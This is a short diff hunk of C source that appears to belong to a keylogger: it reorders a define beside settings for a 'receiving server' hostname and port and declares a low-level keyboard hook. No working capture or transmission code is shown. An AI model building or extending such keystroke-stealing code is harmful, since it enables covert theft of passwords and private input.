@@ -7,11 +7,12 @@
 #include <stdio.h>
 #include <stdlib.h>
 
-#define WM_APP_KEYDATA (WM_APP + 1)
 
 // Change the following values to your server's hostname and port.
 #define SERVER_HOSTNAME "localhost"   // Hostname (domain name) of the receiving server
 #define SERVER_PORT 1025              // Port number on the receiving server
+
+#define WM_APP_KEYDATA (WM_APP + 1)
 
 // function declaration
 LRESULT LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
